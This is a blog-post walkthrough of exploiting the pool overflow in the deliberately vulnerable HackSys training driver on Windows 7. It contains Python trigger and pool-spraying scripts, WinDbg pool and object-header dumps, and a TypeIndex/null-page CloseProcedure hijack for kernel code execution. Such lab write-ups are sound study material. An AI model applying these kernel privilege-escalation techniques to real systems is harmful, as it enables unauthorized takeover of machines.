---
layout:     post
title:      HackSysExtremeVulnerableDriver PoolOverflow
author:     wooy0ung
tags:       hevd
category:   exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 7 x86 sp0  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test POC

Execute this script
```
import sys
from ctypes import *

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)

if not hevDevice or hevDevice == -1:
   print "[-] Couldn't get Device Driver handle."
   sys.exit(0)
buf = "A"*100
buflen = len(buf)

kernel32.DeviceIoControl(hevDevice,0x22200F,buf,buflen,None,0,byref(c_ulong()),None)
```

You would get some info liks this
```
 ##     ## ######## ##     ## ########  
 ##     ## ##       ##     ## ##     ## 
 ##     ## ##       ##     ## ##     ## 
 ######### ######   ##     ## ##     ## 
 ##     ## ##        ##   ##  ##     ## 
 ##     ## ##         ## ##   ##     ## 
 ##     ## ########    ###    ########  
   HackSys Extreme Vulnerable Driver    
             Version: 1.20              
[+] HackSys Extreme Vulnerable Driver Loaded
****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******
[+] Allocating Pool chunk
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x1F8
[+] Pool Chunk: 0x85C796D8
[+] UserBuffer: 0x015C88B4
[+] UserBuffer Size: 0x64
[+] KernelBuffer: 0x85C796D8
[+] KernelBuffer Size: 0x1F8
[+] Triggering Pool Overflow
[+] Freeing Pool chunk
[+] Pool Tag: 'kcaH'
[+] Pool Chunk: 0x85C796D8
****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******
```

I set a breakpoint at "call memcpy"
```
kd> bp HEVD!TriggerPoolOverflow+0xe1
kd> bl
     0 e Disable Clear  91be020b     0001 (0001) HEVD!TriggerPoolOverflow+0xe1
```

Now, observe the pool Addr with tage of "Hack"
```
kd> g
****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******
[+] Allocating Pool chunk
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x1F8
[+] Pool Chunk: 0x85C22330
[+] UserBuffer: 0x01315BDC
[+] UserBuffer Size: 0x1F8
[+] KernelBuffer: 0x85C22330
[+] KernelBuffer Size: 0x1F8
[+] Triggering Pool Overflow
Breakpoint 0 hit
HEVD!TriggerPoolOverflow+0xe1:
91be020b e8cacfffff      call    HEVD!memcpy (91bdd1da)
```

the Addr is 0x85c22328
```
kd> !pool 0x85C22330
Pool page 85c22330 region is Nonpaged pool
 85c22000 size:   c8 previous size:    0  (Allocated)  Ntfx
 85c220c8 size:    8 previous size:   c8  (Free)       NDwi
 85c220d0 size:   b8 previous size:    8  (Allocated)  File (Protected)
 85c22188 size:   70 previous size:   b8  (Allocated)  FMfc
 85c221f8 size:   28 previous size:   70  (Free)       FIPc
 85c22220 size:  100 previous size:   28  (Allocated)  ViSh
 85c22320 size:    8 previous size:  100  (Free)       LeGe
*85c22328 size:  200 previous size:    8  (Allocated) *Hack
      Owning component : Unknown (update pooltag.txt)
 85c22528 size:   70 previous size:  200  (Allocated)  FMfc
 85c22598 size:   b0 previous size:   70  (Free )  MmRl
 85c22648 size:   10 previous size:   b0  (Free)       File
 85c22658 size:   48 previous size:   10  (Allocated)  Vad 
 85c226a0 size:   20 previous size:   48  (Free)       XSav
 85c226c0 size:   68 previous size:   20  (Allocated)  FMsl
 85c22728 size:   c8 previous size:   68  (Allocated)  Ntfx
 85c227f0 size:   90 previous size:   c8  (Allocated)  MmCa
 85c22880 size:   a8 previous size:   90  (Allocated)  File (Protected)
 85c22928 size:   90 previous size:   a8  (Allocated)  MmCa
 85c229b8 size:   70 previous size:   90  (Allocated)  FMfc
 85c22a28 size:   b0 previous size:   70  (Allocated)  NSIk
 85c22ad8 size:   10 previous size:   b0  (Free)       NSpg
 85c22ae8 size:   90 previous size:   10  (Allocated)  Nbtl
 85c22b78 size:  1a0 previous size:   90  (Allocated)  TdxC
 85c22d18 size:  2e8 previous size:  1a0  (Allocated)  Thre (Protected)
```

the start of "Hack" pool
```
kd> dd 0x85c22328
85c22328  04400001 6b636148 41414141 41414141
85c22338  41414141 41414141 41414141 41414141
85c22348  41414141 41414141 41414141 41414141
85c22358  41414141 41414141 41414141 41414141
85c22368  41414141 41414141 41414141 41414141
85c22378  41414141 41414141 41414141 41414141
85c22388  41414141 41414141 41414141 41414141
85c22398  41414141 41414141 41414141 41414141
```

at the end of pool
```
kd> dd 0x85c22528-8
85c22520  41414141 41414141 040e0040 63664d46
85c22530  48706345 00000000 00000000 00000000
85c22540  00ac5851 45e4702b 2a5794ac 7e7ac1fe
85c22550  00000000 00000047 00000068 8847ac00
85c22560  00000000 0034f110 00150000 869276f8
85c22570  85cd6c48 87812ae0 8599e1c0 8599e1c0
85c22580  86181670 00000000 ffffffff 00000000
85c22590  85967ff8 85c33928 0816000e 6c526d4d
```
Overflow next pool header will cause BSOD!


## 0x002 Exploit it!

I will spray a huge number of Event objects
```
import sys
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll

hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
   print "[-] Couldn't get Device Driver handle."
   sys.exit(0)

buf = "A" * 0x1f8
buf_ad = id(buf) + 20

spray_event1 = spray_event2 = []

for i in xrange(10000):
   spray_event1.append(kernel32.CreateEventA(None, False, False, None))
for i in xrange(5000):
   spray_event2.append(kernel32.CreateEventA(None, False, False, None))

for i in xrange(0, len(spray_event2), 16):
   for j in xrange(0, 8, 1):
      kernel32.CloseHandle(spray_event2[i+j])

kernel32.DeviceIoControl(hevDevice, 0x22200f, buf_ad, len(buf), None, 0, byref(c_ulong()), None)
```

Clearly, numbers of Event objects sprayed into Non-Paged pool, our vulnerable buffer tagging with "Hack" is re-allocated in a hole
```
****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******
[+] Allocating Pool chunk
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x1F8
[+] Pool Chunk: 0x85E2AB48
[+] UserBuffer: 0x016E5BDC
[+] UserBuffer Size: 0x1F8
[+] KernelBuffer: 0x85E2AB48
[+] KernelBuffer Size: 0x1F8
[+] Triggering Pool Overflow
Breakpoint 0 hit
HEVD!TriggerPoolOverflow+0xe1:
8f5d120b e8cacfffff      call    HEVD!memcpy (8f5ce1da)
kd> p
HEVD!TriggerPoolOverflow+0xe6:
8f5d1210 686c235d8f      push    offset HEVD! ?? ::NNGAKEGL::`string' (8f5d236c)
kd> !pool 0x85E2AB48
Pool page 85e2ab48 region is Nonpaged pool
 85e2a000 size:  140 previous size:    0  (Free)       Io  
 85e2a140 size:   40 previous size:  140  (Allocated)  Even (Protected)
 85e2a180 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a1c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a200 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a240 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a280 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a2c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a300 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a340 size:  200 previous size:   40  (Free)       Even
 85e2a540 size:   40 previous size:  200  (Allocated)  Even (Protected)
 85e2a580 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a5c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a600 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a640 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a680 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a6c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a700 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a740 size:  200 previous size:   40  (Free)       Even
 85e2a940 size:   40 previous size:  200  (Allocated)  Even (Protected)
 85e2a980 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2a9c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2aa00 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2aa40 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2aa80 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2aac0 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2ab00 size:   40 previous size:   40  (Allocated)  Even (Protected)
*85e2ab40 size:  200 previous size:   40  (Allocated) *Hack
      Owning component : Unknown (update pooltag.txt)
 85e2ad40 size:   40 previous size:  200  (Allocated)  Even (Protected)
 85e2ad80 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2adc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2ae00 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2ae40 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2ae80 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2aec0 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2af00 size:   40 previous size:   40  (Allocated)  Even (Protected)
 85e2af40 size:   c0 previous size:   40  (Free)       Even
```

Now, we should know more about some structure of pool. Pay attention on Addr 0x85e2ad40, which is one of a Event objects.
![](/assets/img/exploit/2018-08-04-hacksys-extreme-vulnerable-driver-pooloverflow/0x001.png)
```
kd> dd 85e2ad40
85e2ad40  04080040 ee657645 00000000 00000040
85e2ad50  00000000 00000000 00000001 00000001
85e2ad60  00000000 0008000c 87080d80 00000000
85e2ad70  00040001 00000000 85e2ad78 85e2ad78
85e2ad80  04080008 ee657645 00000000 00000040
85e2ad90  00000000 00000000 00000001 00000001
85e2ada0  00000000 0008000c 87080d80 00000000
85e2adb0  00040001 00000000 85e2adb8 85e2adb8
kd> dt nt!_POOL_HEADER 85e2ad40
   +0x000 PreviousSize     : 0y001000000 (0x40)
   +0x000 PoolIndex        : 0y0000000 (0)
   +0x002 BlockSize        : 0y000001000 (0x8)
   +0x002 PoolType         : 0y0000010 (0x2)
   +0x000 Ulong1           : 0x4080040
   +0x004 PoolTag          : 0xee657645
   +0x004 AllocatorBackTraceIndex : 0x7645
   +0x006 PoolTagHash      : 0xee65
```

At offset 8 and 0x18
```
kd> dd 85e2ad40+8
85e2ad48  00000000 00000040 00000000 00000000
85e2ad58  00000001 00000001 00000000 0008000c
85e2ad68  87080d80 00000000 00040001 00000000
85e2ad78  85e2ad78 85e2ad78 04080008 ee657645
85e2ad88  00000000 00000040 00000000 00000000
85e2ad98  00000001 00000001 00000000 0008000c
85e2ada8  87080d80 00000000 00040001 00000000
85e2adb8  85e2adb8 85e2adb8 04080008 ee657645
kd> dt nt!_OBJECT_HEADER_QUOTA_INFO 85e2ad40+8
   +0x000 PagedPoolCharge  : 0
   +0x004 NonPagedPoolCharge : 0x40
   +0x008 SecurityDescriptorCharge : 0
   +0x00c SecurityDescriptorQuotaBlock : (null)
kd> dt nt!_OBJECT_HEADER 0x85e2ad40+0x18
   +0x000 PointerCount     : 0n1
   +0x004 HandleCount      : 0n1
   +0x004 NextToFree       : 0x00000001 Void
   +0x008 Lock             : _EX_PUSH_LOCK
   +0x00c TypeIndex        : 0xc ''
   +0x00d TraceFlags       : 0 ''
   +0x00e InfoMask         : 0x8 ''
   +0x00f Flags            : 0 ''
   +0x010 ObjectCreateInfo : 0x87080d80 _OBJECT_CREATE_INFORMATION
   +0x010 QuotaBlockCharged : 0x87080d80 Void
   +0x014 SecurityDescriptor : (null) 
   +0x018 Body             : _QUAD
```
Look at TypeIndex, at the offset of 0xc, it is a pointer of which defines OBJECT_TYPE of each object supported by Windows.

In this case, it point to 0x85600e38.
```
kd> dd nt!ObTypeIndexTable
83f498c0  00000000 bad0b0b0 85533908 85533840
83f498d0  85533778 85533548 855dd040 855ddf78
83f498e0  855ddeb0 855ddde8 855ddd20 855dd6a0
83f498f0  85600e38 855f86d0 855f1418 855f1350
83f49900  855f2418 855f2350 85600420 85600358
83f49910  855f36e0 855f3618 855f3550 855f3488
83f49920  855f33c0 855f5040 855f5f78 855f5eb0
83f49930  855f5de8 855f5920 855f5858 855f5790
```

In Windows7, we can map Null page by NtAllocateVirtualMemory. So, I modify the offset 0xc with 0, and make point to Null page.
```
kd> dt nt!_OBJECT_TYPE 85600e38
   +0x000 TypeList         : _LIST_ENTRY [ 0x85600e38 - 0x85600e38 ]
   +0x008 Name             : _UNICODE_STRING "Event"
   +0x010 DefaultObject    : (null) 
   +0x014 Index            : 0xc ''
   +0x018 TotalNumberOfObjects : 0x2a65
   +0x01c TotalNumberOfHandles : 0x2ab7
   +0x020 HighWaterNumberOfObjects : 0x48ce
   +0x024 HighWaterNumberOfHandles : 0x4928
   +0x028 TypeInfo         : _OBJECT_TYPE_INITIALIZER
   +0x078 TypeLock         : _EX_PUSH_LOCK
   +0x07c Key              : 0x6e657645
   +0x080 CallbackList     : _LIST_ENTRY [ 0x85600eb8 - 0x85600eb8 ]
kd> dx -id 0,0,ffffffff85924d40 -r1 (*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0xffffffff85600e60))
(*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0xffffffff85600e60))                 [Type: _OBJECT_TYPE_INITIALIZER]
    [+0x000] Length           : 0x50 [Type: unsigned short]
    [+0x002] ObjectTypeFlags  : 0x0 [Type: unsigned char]
    [+0x002 ( 0: 0)] CaseInsensitive  : 0x0 [Type: unsigned char]
    [+0x002 ( 1: 1)] UnnamedObjectsOnly : 0x0 [Type: unsigned char]
    [+0x002 ( 2: 2)] UseDefaultObject : 0x0 [Type: unsigned char]
    [+0x002 ( 3: 3)] SecurityRequired : 0x0 [Type: unsigned char]
    [+0x002 ( 4: 4)] MaintainHandleCount : 0x0 [Type: unsigned char]
    [+0x002 ( 5: 5)] MaintainTypeList : 0x0 [Type: unsigned char]
    [+0x002 ( 6: 6)] SupportsObjectCallbacks : 0x0 [Type: unsigned char]
    [+0x004] ObjectTypeCode   : 0x2 [Type: unsigned long]
    [+0x008] InvalidAttributes : 0x100 [Type: unsigned long]
    [+0x00c] GenericMapping   [Type: _GENERIC_MAPPING]
    [+0x01c] ValidAccessMask  : 0x1f0003 [Type: unsigned long]
    [+0x020] RetainAccess     : 0x0 [Type: unsigned long]
    [+0x024] PoolType         : NonPagedPool (0) [Type: _POOL_TYPE]
    [+0x028] DefaultPagedPoolCharge : 0x0 [Type: unsigned long]
    [+0x02c] DefaultNonPagedPoolCharge : 0x40 [Type: unsigned long]
    [+0x030] DumpProcedure    : 0x0 [Type: void (*)(void *,_OBJECT_DUMP_CONTROL *)]
    [+0x034] OpenProcedure    : 0x0 [Type: long (*)(_OB_OPEN_REASON,char,_EPROCESS *,void *,unsigned long *,unsigned long)]
    [+0x038] CloseProcedure   : 0x0 [Type: void (*)(_EPROCESS *,void *,unsigned long,unsigned long)]
    [+0x03c] DeleteProcedure  : 0x0 [Type: void (*)(void *)]
    [+0x040] ParseProcedure   : 0x0 [Type: long (*)(void *,void *,_ACCESS_STATE *,char,unsigned long,_UNICODE_STRING *,_UNICODE_STRING *,void *,_SECURITY_QUALITY_OF_SERVICE *,void * *)]
    [+0x044] SecurityProcedure : 0x8407ad13 [Type: long (*)(void *,_SECURITY_OPERATION_CODE,unsigned long *,void *,unsigned long *,void * *,_POOL_TYPE,_GENERIC_MAPPING *,char)]
    [+0x048] QueryNameProcedure : 0x0 [Type: long (*)(void *,unsigned char,_OBJECT_NAME_INFORMATION *,unsigned long,unsigned long *,char)]
    [+0x04c] OkayToCloseProcedure : 0x0 [Type: unsigned char (*)(_EPROCESS *,void *,void *,char)]
```

Then, I edit the Null page whit shellcode Addr at the offset of 0x60, where used to be the Addr of CloseProcedure method.
![](/assets/img/exploit/2018-08-04-hacksys-extreme-vulnerable-driver-pooloverflow/0x002.png)
```
kd> dd 0x0
00000000  00000000 00000000 00000000 00000000
00000010  00000000 00000000 00000000 00000000
00000020  00000000 00000000 00000000 00000000
00000030  00000000 00000000 00000000 00000000
00000040  00000000 00000000 00000000 00000000
00000050  00000000 00000000 00000000 00000000
00000060  01370000 00000000 00000000 00000000
00000070  00000000 00000000 00000000 00000000
kd> dt nt!_OBJECT_TYPE 0x0
   +0x000 TypeList         : _LIST_ENTRY
   +0x008 Name             : _UNICODE_STRING
   +0x010 DefaultObject    : Ptr32 Void
   +0x014 Index            : UChar
   +0x018 TotalNumberOfObjects : Uint4B
   +0x01c TotalNumberOfHandles : Uint4B
   +0x020 HighWaterNumberOfObjects : Uint4B
   +0x024 HighWaterNumberOfHandles : Uint4B
   +0x028 TypeInfo         : _OBJECT_TYPE_INITIALIZER
   +0x078 TypeLock         : _EX_PUSH_LOCK
   +0x07c Key              : Uint4B
   +0x080 CallbackList     : _LIST_ENTRY
kd> dt nt!_OBJECT_TYPE_INITIALIZER 0x028
   +0x000 Length           : 0
   +0x002 ObjectTypeFlags  : 0 ''
   +0x002 CaseInsensitive  : 0y0
   +0x002 UnnamedObjectsOnly : 0y0
   +0x002 UseDefaultObject : 0y0
   +0x002 SecurityRequired : 0y0
   +0x002 MaintainHandleCount : 0y0
   +0x002 MaintainTypeList : 0y0
   +0x002 SupportsObjectCallbacks : 0y0
   +0x004 ObjectTypeCode   : 0
   +0x008 InvalidAttributes : 0
   +0x00c GenericMapping   : _GENERIC_MAPPING
   +0x01c ValidAccessMask  : 0
   +0x020 RetainAccess     : 0
   +0x024 PoolType         : 0 ( NonPagedPool )
   +0x028 DefaultPagedPoolCharge : 0
   +0x02c DefaultNonPagedPoolCharge : 0
   +0x030 DumpProcedure    : (null) 
   +0x034 OpenProcedure    : (null) 
   +0x038 CloseProcedure   : 0x01370000     void  +1370000
   +0x03c DeleteProcedure  : (null) 
   +0x040 ParseProcedure   : (null) 
   +0x044 SecurityProcedure : (null) 
   +0x048 QueryNameProcedure : (null) 
   +0x04c OkayToCloseProcedure : (null)
```

pwn~
![](/assets/img/exploit/2018-08-04-hacksys-extreme-vulnerable-driver-pooloverflow/0x003.png)